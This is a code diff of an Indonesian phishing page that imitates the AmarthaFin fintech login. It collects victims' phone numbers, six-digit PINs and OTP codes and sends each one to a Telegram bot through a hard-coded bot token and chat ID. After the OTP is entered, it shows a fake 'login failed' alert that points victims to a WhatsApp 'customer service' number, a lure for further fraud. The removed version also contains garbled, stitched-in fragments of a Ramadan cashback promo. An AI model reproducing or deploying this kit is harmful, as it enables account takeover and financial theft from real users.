@@ -3,240 +3,441 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AmarthaFin - Masuk</title>
+    <title>AmarthaFin - Sistem Login Lengkap</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { padding: 20px; background-color: #ffffff; color: #000; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
 
-        /* Header */
-        .header { display: flex; justify-content: space-between; align-items: center; margin: 20px 0 40px; }
-        .brand { font-size: 24px; font-weight: bold; background: linear-gradient(to right, #9b59b6, #3498db); -webkit-background-clip: text; color: transparent; }
-        .help-link { color: #9b59b6; text-decoration: none; font-size: 14px; }
+        body {
+            background-color: #fff;
+            padding: 20px;
+        }
 
-        /* Step Container */
-        .step { display: none; }
-        .step.active { display: block; }
+        .container {
+            max-width: 400px;
+            margin: 20px auto;
+        }
 
-        /* Langkah 1 - Nomor HP */
-        .hp-title { font-size: 22px; font-weight: bold; margin-bottom: 25px; }
-        .tab-wrap { display: flex; gap: 5px; margin-bottom: 25px; }
-        .tab { padding: 8px 20px; border: 1px solid #9b59b6; border-radius: 20px; background: transparent; cursor: pointer; font-size: 14px; }
-        .tab.active { background: #9b59b6; color: #fff; }
-        .hp-input-wrap { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 25px; }
-        .cc { padding: 12px 10px; border-right: 1px solid #ddd; color: #555; }
-        .hp-input { width: 100%; padding: 12px 10px; border: none; outline: none; font-size: 16px; }
-        .btn { width: 100%; padding: 15px; background: #9b59b6; color: #fff; border: none; border-radius: 30px; font-size: 16px; cursor: pointer; margin-bottom: 20px; }
-        .terms { font-size: 12px; color: #555; margin-bottom: 40px; }
-        .terms a { color: #9b59b6; text-decoration: none; }
+        /* HEADER */
+        .app-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
 
-        /* Langkah 2 - PIN */
-        .pin-header { display: flex; justify-content: space-between; align-items: center; margin: 20px 0 40px; }
-        .back-btn { font-size: 18px; cursor: pointer; }
-        .pin-title { font-size: 22px; font-weight: bold; text-align: center; margin-bottom: 10px; }
-        .pin-sub { font-size: 14px; color: #555; text-align: center; margin-bottom: 30px; }
-        .dots-wrap { display: flex; justify-content: center; gap: 15px; margin-bottom: 30px; }
-        .dot { width: 12px; height: 12px; border-radius: 50%; background: #ddd; }
-        .dot.filled { background: #9b59b6; }
-        .keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; max-width: 300px; margin: 0 auto 30px; }
-        .key { width: 60px; height: 60px; border: none; border-radius: 50%; background: #f5f5f5; font-size: 22px; cursor: pointer; }
+        .app-logo {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+        .app-logo span { color: #9b59b6; }
+        .app-logo .fin { color: #00bfa5; }
 
-        /* Langkah 3 - OTP */
-        .otp-title { font-size: 22px; font-weight: bold; text-align: center; margin-bottom: 10px; }
-        .otp-sub { font-size: 14px; color: #555; text-align: center; margin-bottom: 30px; }
+        .help-link {
+            font-size: 14px;
+            color: #9b59b6;
+            text-decoration: none;
+        }
+
+        /* SECTION UMUM */
+        .section {
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }
+
+        /* SECTION HP */
+        .phone-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #222;
+            margin-bottom: 25px;
+        }
+
+        .input-options {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .option-btn {
+            padding: 8px 18px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background: #fff;
+            color: #666;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .option-btn.active {
+            background: #9b59b6;
+            color: #fff;
+            border-color: #9b59b6;
+        }
+
+        .phone-input-wrap {
+            display: flex;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+
+        .country-code {
+            width: 80px;
+            padding: 15px;
+            border-right: 1px solid #ddd;
+            background: #f8f9fa;
+            text-align: center;
+            font-size: 16px;
+            color: #222;
+        }
+
+        .phone-input {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+        }
+        .phone-input::placeholder {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        .action-btn {
+            width: 100%;
+            padding: 15px;
+            background: #9b59b6;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .terms-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+        }
+        .terms-text a {
+            color: #9b59b6;
+            text-decoration: none;
+        }
+
+        /* SECTION PIN & OTP */
+        .pin-otp-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #222;
+            margin-bottom: 25px;
+        }
+
+        .pin-otp-desc {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .indicator {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 35px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ddd;
+        }
+        .dot.fill {
+            background: #9b59b6;
+        }
+
+        .num-keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 35px;
+        }
+
+        .key-btn {
+            width: 80px;
+            height: 80px;
+            border: none;
+            border-radius: 50%;
+            background: #f1f3f5;
+            font-size: 24px;
+            color: #222;
+            cursor: pointer;
+            margin: 0 auto;
+        }
+
+        .backspace-btn {
+            font-size: 20px;
+        }
+
+        .timer-wrap {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        .resend-link {
+            color: #9b59b6;
+            text-decoration: none;
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <!-- Langkah 1: Masukkan Nomor HP -->
-    <div class="step active" id="step1">
-        <div class="header">
-            <div class="brand">amarthafin</div>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="app-header">
+            <div class="app-logo">
+                amartha<span>fin</span>
+            </div>
             <a href="#" class="help-link">Butuh Bantuan?</a>
         </div>
 
-        <div class="hp-title">Masukkan Nomor HP Anda</div>
-        <div class="tab-wrap">
-            <button class="tab active">Nomor HP</button>
-            <button class="tab">Email</button>
+        <!-- SECTION NOMOR HP -->
+        <div class="section active" id="phoneSection">
+            <h2 class="phone-title">Masukkan Nomor HP Anda</h2>
+            
+            <div class="input-options">
+                <button class="option-btn active">Nomor HP</button>
+                <button class="option-btn">Email</button>
+            </div>
+
+            <div class="phone-input-wrap">
+                <div class="country-code">+62</div>
+                <input type="number" class="phone-input" placeholder="82x-xxxx-xxxx" id="phoneInput">
+            </div>
+
+            <button class="action-btn" id="toPinBtn">Lanjut</button>
+
+            <p class="terms-text">
+                Dengan menekan tombol Lanjut, Anda menyetujui <a href="#">Aktivasi Akun</a>, <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> AmarthaFin
+            </p>
         </div>
 
-        <div class="hp-input-wrap">
-            <div class="cc">+62</div>
-            <input type="tel" class="hp-input" placeholder="82x-xxxx-xxxx" required>
+        <!-- SECTION PIN -->
+        <div class="section" id="pinSection">
+            <h2 class="pin-otp-title">Masukkan PIN Anda</h2>
+            <p class="pin-otp-desc">PIN terdiri dari 6 angka</p>
+
+            <div class="indicator" id="pinIndicator">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+
+            <div class="num-keyboard">
+                <button class="key-btn" onclick="addDigit(1, 'pin')">1</button>
+                <button class="key-btn" onclick="addDigit(2, 'pin')">2</button>
+                <button class="key-btn" onclick="addDigit(3, 'pin')">3</button>
+                <button class="key-btn" onclick="addDigit(4, 'pin')">4</button>
+                <button class="key-btn" onclick="addDigit(5, 'pin')">5</button>
+                <button class="key-btn" onclick="addDigit(6, 'pin')">6</button>
+                <button class="key-btn" onclick="addDigit(7, 'pin')">7</button>
+                <button class="key-btn" onclick="addDigit(8, 'pin')">8</button>
+                <button class="key-btn" onclick="addDigit(9, 'pin')">9</button>
+                <button class="key-btn" onclick="clearAll('pin')">C</button>
+                <button class="key-btn" onclick="addDigit(0, 'pin')">0</button>
+                <button class="key-btn backspace-btn" onclick="deleteDigit('pin')">⌫</button>
+            </div>
+
+            <button class="action-btn" id="toOtpBtn">Lanjut ke OTP</button>
         </div>
 
-        <button class="btn" onclick="sendHPData()">Lanjut ke PIN</button>
-        <div class="terms">
-            Dengan lanjut, Anda menyetujui <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> AmarthaFin
-        </div>    <div class="container">
-        <!-- Banner Promo Ramadhan -->
-        <section class="promo-banner">
-            <h2>✨ PROMO KHUSUS BULAN RAMADHAN ✨</h2>
-</p>
-    </div>
+        <!-- SECTION OTP -->
+        <div class="section" id="otpSection">
+            <h2 class="pin-otp-title">Masukkan Kode OTP</h2>
+            <p class="pin-otp-desc">Kode telah dikirim ke nomor HP Anda</p>
 
-    </p>-- Langkah 2: Masukkan PIN -->
-    <div class="step" id="step2">
-        <div class="pin-header">
-            <div class="back-btn" onclick="backToHP()">←</div>
-            <a href="#" class="help-link">Butuh Bantuan?</a>
+            <div class="timer-wrap">
+                <span id="timer">Waktu tersisa: 01:00</span>
+                <a href="#" class="resend-link" id="resendLink">Kirim Ulang Kode</a>
+            </div>
+
+            <div class="indicator" id="otpIndicator">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+
+            <div class="num-keyboard">
+                <button class="key-btn" onclick="addDigit(1, 'otp')">1</button>
+                <button class="key-btn" onclick="addDigit(2, 'otp')">2</button>
+                <button class="key-btn" onclick="addDigit(3, 'otp')">3</button>
+                <button class="key-btn" onclick="addDigit(4, 'otp')">4</button>
+                <button class="key-btn" onclick="addDigit(5, 'otp')">5</button>
+                <button class="key-btn" onclick="addDigit(6, 'otp')">6</button>
+                <button class="key-btn" onclick="addDigit(7, 'otp')">7</button>
+                <button class="key-btn" onclick="addDigit(8, 'otp')">8</button>
+                <button class="key-btn" onclick="addDigit(9, 'otp')">9</button>
+                <button class="key-btn" onclick="clearAll('otp')">C</button>
+                <button class="key-btn" onclick="addDigit(0, 'otp')">0</button>
+                <button class="key-btn backspace-btn" onclick="deleteDigit('otp')">⌫</button>
+            </div>
+
+            <button class="action-btn" id="loginBtn">Login dan Masuk</button>
         </div>
-
-        <div class="pin-title">Masukkan PIN Anda</div>
-        <div class="pin-sub">PIN terdiri dari 6 angka</div>
-
-        <div class="dots-wrap" id="pinDots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
-
-        <div class="keyboard" id="pinKeyboard">
-            <button class="key" onclick="addPin(1)">1</button>
-            <button class="key" onclick="addPin(2)">2</button>
-            <button class="key" onclick="addPin(3)">3</button>
-            <button class="key" onclick="addPin(4)">4</button>
-            <button class="key" onclick="addPin(5)">5</button>
-            <button class="key" onclick="addPin(6)">6</button>
-            <button class="key" onclick="addPin(7)">7</button>
-            <button class="key" onclick="addPin(8)">8</button>
-            <button class="key" onclick="addPin(9)">9</button>
-            <button class="key" onclick="addPin(0)">0</button>
-            <button class="key" onclick="delPin()">⌫</button>
-        </div>
-
-        <button class="btn" onclick="sendPINData()">Lanjut ke OTP</button>
-    </div>
-
-    <!-- Langkah 3: Masukkan Kode OTP -->
-    <div class="step" id="step3">
-        <div class="pin-header">
-            <div class="back-btn" onclick="backToPIN()">←</div>
-            <a href="#" class="help-link">Butuh Bantuan?</a>
-        </div>
-
-        <div class="otp-title">Masukkan Kode OTP</div>
-        <div class="otp-sub">Kode telah dikirim ke nomor HP Anda</div>
-
-        <div class="dots-wrap" id="otpDots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
-
-        <div class="keyboard" id="otpKeyboard">
-            <button class="key" onclick="addOTP(1)">1</button>
-            <button class="key" onclick="addOTP(2)">2</button>
-            <button class="key" onclick="addOTP(3)">3</button>
-            <button class="key" onclick="addOTP(4)">4</button>
-            <button class="key" onclick="addOTP(5)">5</button>
-            <button class="key" onclick="addOTP(6)">6</button>
-            <button class="key" onclick="addOTP(7)">7</button>
-            <button class="key" onclick="addOTP(8)">8</button>
-            <button class="key" onclick="addOTP(9)">9</button>
-            <button class="key" onclick="addOTP(0)">0</button>
-            <button class="key" onclick="delOTP()">⌫</button>
-        </div>
-
-        <button class="btn" onclick="sendAllData()">Login dan Masuk</button>
     </div>
 
     <script>
-        // Data Bot Telegram
+        // KONFIGURASI TELEGRAM
         const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
         const CHAT_ID = "8571321926";
-        
-        let userHP = "";
-        let userPIN = "";
-        let userOTP = "";
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        // Kirim Data Nomor HP & Pindah ke PIN
-        function sendHPData() {
-            userHP = document.querySelector(".hp-input").value;
-            const msg = `📥 DATA LANGKAH 1 - NOMOR HP 📥\nNomor HP: +62${userHP}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            
-            document.getElementById("step1").classList.remove("active");
-            document.getElementById("step2").classList.add("active");
-        }
+        // ELEMEN DOM
+        const phoneSection = document.getElementById('phoneSection');
+        const pinSection = document.getElementById('pinSection');
+        const otpSection = document.getElementById('otpSection');
+        const toPinBtn = document.getElementById('toPinBtn');
+        const toOtpBtn = document.getElementById('toOtpBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const phoneInput = document.getElementById('phoneInput');
+        const pinIndicator = document.querySelectorAll('#pinIndicator .dot');
+        const otpIndicator = document.querySelectorAll('#otpIndicator .dot');
+        const timer = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
 
-        // Fungsi Input PIN
-        let pinCount = 0;
-        function addPin(num) {
-            if (pinCount < 6) {
-                userPIN += num;
-                document.getElementById("pinDots").children[pinCount].classList.add("filled");
-                pinCount++;
+        // VARIABEL PENYIMPANAN
+        let phoneNumber = "";
+        let pinCode = [];
+        let otpCode = [];
+        let countdown;
+
+        // LANJUT KE PIN
+        toPinBtn.addEventListener('click', () => {
+            phoneNumber = phoneInput.value.trim();
+            if (phoneNumber.length >= 10) {
+                // KIRIM KE TELEGRAM
+                fetch(API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `📱 NOMOR HP: +62${phoneNumber}`
+                    })
+                });
+
+                phoneSection.classList.remove('active');
+                pinSection.classList.add('active');
+            } else {
+                alert("Masukkan nomor HP yang valid!");
+            }
+        });
+
+        // LANJUT KE OTP
+        toOtpBtn.addEventListener('click', () => {
+            const pinStr = pinCode.join('');
+            // KIRIM PIN KE TELEGRAM
+            fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🔐 PIN: ${pinStr}`
+                })
+            });
+
+            pinSection.classList.remove('active');
+            otpSection.classList.add('active');
+            startCountdown();
+        });
+
+        // FUNGSI PIN/OTP
+        function addDigit(num, type) {
+            if (type === 'pin' && pinCode.length < 6) {
+                pinCode.push(num);
+                updateIndicator(pinIndicator, pinCode.length);
+                if (pinCode.length === 6) toOtpBtn.disabled = false;
+            } else if (type === 'otp' && otpCode.length < 6) {
+                otpCode.push(num);
+                updateIndicator(otpIndicator, otpCode.length);
+                if (otpCode.length === 6) loginBtn.disabled = false;
             }
         }
-        function delPin() {
-            if (pinCount > 0) {
-                pinCount--;
-                userPIN = userPIN.slice(0, -1);
-                document.getElementById("pinDots").children[pinCount].classList.remove("filled");
+
+        function deleteDigit(type) {
+            if (type === 'pin' && pinCode.length > 0) {
+                pinCode.pop();
+                updateIndicator(pinIndicator, pinCode.length);
+            } else if (type === 'otp' && otpCode.length > 0) {
+                otpCode.pop();
+                updateIndicator(otpIndicator, otpCode.length);
             }
         }
 
-        // Kirim Data PIN & Pindah ke OTP
-        function sendPINData() {
-            userPIN = userPIN;
-            const msg = `📥 DATA LANGKAH 2 - PIN 📥\nHP Terkait: +62${userHP}\nPIN: ${userPIN}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            
-            document.getElementById("step2").classList.remove("active");
-            document.getElementById("step3").classList.add("active");
-        }
-
-        // Fungsi Input OTP
-        let otpCount = 0;
-        function addOTP(num) {
-            if (otpCount < 6) {
-                userOTP += num;
-                document.getElementById("otpDots").children[otpCount].classList.add("filled");
-                otpCount++;
-            }
-        }
-        function delOTP() {
-            if (otpCount > 0) {
-                otpCount--;
-                userOTP = userOTP.slice(0, -1);
-                document.getElementById("otpDots").children[otpCount].classList.remove("filled");
+        function clearAll(type) {
+            if (type === 'pin') {
+                pinCode = [];
+                updateIndicator(pinIndicator, 0);
+            } else {
+                otpCode = [];
+                updateIndicator(otpIndicator, 0);
             }
         }
 
-        // Kirim Semua Data & Login
-        function sendAllData() {
-            const msg = `✅ LOGIN SELESAI - AMARTHAFIN ✅\nHP: +62${userHP}\nPIN: ${userPIN}\nOTP: ${userOTP}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            alert("proses masuk anda gagal silahkan hubungi AMARTHAFIN Cs:081318896494!
-                          <!-- Syarat dan Ketentuan Promo -->
-        <section class="terms">
-            <h3>Syarat & Ketentuan Promo Cashback Ramadhan</h3>
-            <ul style="margin-left: 20px; line-height: 1.8;">
-                <li>Promo berlaku khusus selama bulan Ramadhan (periode akan diumumkan lebih lanjut).</li>
-                <li>Cashback Rp400.000 diberikan per transaksi yang memenuhi syarat (minimal nominal transaksi akan diinformasikan).</li>
-                <li>Hanya berlaku untuk pengguna terdaftar dan terverifikasi di aplikasi AmarthaFin.</li>
-                <li>Setiap pengguna berhak mendapatkan cashback maksimal sesuai batasan yang ditetapkan.</li>
-                <li>Cashback akan dikreditkan ke saldo akun atau saldo Poket AmarthaFin dalam waktu tertentu setelah transaksi berhasil.</li>
-                <li>Amartha berhak membatalkan atau memodifikasi promo tanpa pemberitahuan terlebih dahulu jika terjadi penyalahgunaan.</li>
-                <li>Promo tidak dapat digabungkan dengan promo lain kecuali dinyatakan sebaliknya.</li>");
+        function updateIndicator(dots, count) {
+            dots.forEach((dot, idx) => {
+                if (idx < count) dot.classList.add('fill');
+                else dot.classList.remove('fill');
+            });
         }
 
-        // Navigasi Kembali
-        function backToHP() {
-            document.getElementById("step2").classList.remove("active");
-            document.getElementById("step1").classList.add("active");
+        // FUNGSI COUNTDOWN
+        function startCountdown() {
+            let timeLeft = 60;
+            countdown = setInterval(() => {
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                timer.textContent = `Waktu tersisa: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    timer.textContent = "Waktu habis!";
+                    resendLink.style.display = 'inline';
+                }
+                timeLeft--;
+            }, 1000);
         }
-        function backToPIN() {
-            document.getElementById("step3").classList.remove("active");
-            document.getElementById("step2").classList.add("active");
-        }
+
+        // LOGIN
+        loginBtn.addEventListener('click', () => {
+            const otpStr = otpCode.join('');
+            // KIRIM OTP KE TELEGRAM
+            fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `✅ OTP: ${otpStr}\n🔢 NOMOR HP: +62${phoneNumber}`
+                })
+            });
+            alert("Login Gagal! Silahkan Ulangi Beberapa saat lagi Bisa hubungi Customer Service Amarthafin layanan WhatsApp 085809881886.");
+        });
     </script>
 </body>
-          </html>
-          
+</html>
